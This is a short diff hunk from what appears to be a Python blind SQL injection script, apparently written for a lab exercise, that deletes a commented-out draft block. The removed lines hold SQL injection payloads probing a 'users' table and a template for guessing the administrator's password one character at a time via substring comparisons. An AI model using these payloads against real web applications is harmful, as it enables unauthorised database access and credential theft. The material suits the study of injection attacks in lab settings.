@@ -132,25 +132,3 @@ if __name__ == "__main__":
     main(args)
     
     
-    
-    
-#------------------------------------------------------------------------------------------
-#draft
-
-#xyz' and (select 'a' from users where username = 'administrator' and length(password > 1)) = 'a'-- 
-        
-#xyz' or (select length('aaaa')=4)--       //true its return text "welcmoeback"
-
-#xyz' or (select substring('abcd', 1,1) = 'a')--             // the same response (true)
-# and botta my own builded payload:  xyz' or substring((select password from users where username = 'administrator')1,1) = '{char}'
-
-   
-    
-"""
-select password from users where username = 'administsrator'
-inner query
-
-
-return f"xyz' or substring(({inner_query}), {index},1) = '{char}'-- "
-"""    
-  
